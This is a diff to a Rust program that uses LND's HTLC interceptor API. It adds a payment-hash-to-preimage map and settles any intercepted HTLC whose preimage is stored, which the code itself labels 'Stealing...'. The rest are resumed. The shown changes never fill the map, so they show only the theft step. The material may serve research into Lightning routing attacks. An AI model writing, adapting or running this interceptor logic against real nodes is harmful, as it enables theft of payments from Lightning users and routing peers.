@@ -1,7 +1,10 @@
 // This program accepts four arguments: host, port, cert file, macaroon file
 
+use std::collections::HashMap;
+use std::sync::Arc;
 use sha2::Digest;
 use sha2::Sha256;
+use tokio::sync::Mutex;
 use tokio::task::spawn;
 
 #[tokio::main]
@@ -46,6 +49,8 @@ async fn main() {
     // We only print it here, note that in real-life code you may want to call `.into_inner()` on
     // the response to get the message.
     println!("{:#?}", info.alias);
+
+    let hash_map: Arc<Mutex<HashMap<Vec<u8>, Vec<u8>>>> = Arc::new(Mutex::new(HashMap::new()));
 
     // HTLC event stream part
     println!("starting htlc event subscription");
@@ -104,13 +109,31 @@ async fn main() {
             .expect("Failed to receive HTLCs")
         {
             println!("htlc {:?}", htlc);
-            let response = tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
-                incoming_circuit_key: htlc.incoming_circuit_key,
-                action: 2,        // this will resume
-                preimage: vec![], // this would be for a real preimage
-                failure_code: 0,
-                failure_message: vec![],
+
+            let map = hash_map.lock().await;
+            let response = match map.get(&htlc.payment_hash) {
+                Some(preimage) => {
+                    println!("HTLC preimage saved! Stealing...");
+                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
+                        incoming_circuit_key: htlc.incoming_circuit_key,
+                        action: 0,        // 0 settle, 1 fail, 2 resume
+                        preimage: preimage.to_vec(),
+                        failure_code: 0,
+                        failure_message: vec![],
+                    }
+                },
+                None => {
+                    println!("Do not have HTLC preimage, resuming");
+                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
+                        incoming_circuit_key: htlc.incoming_circuit_key,
+                        action: 2,        // 0 settle, 1 fail, 2 resume
+                        preimage: vec![],
+                        failure_code: 0,
+                        failure_message: vec![],
+                    }
+                }
             };
+
             tx.send(response).await.unwrap();
         }
     });
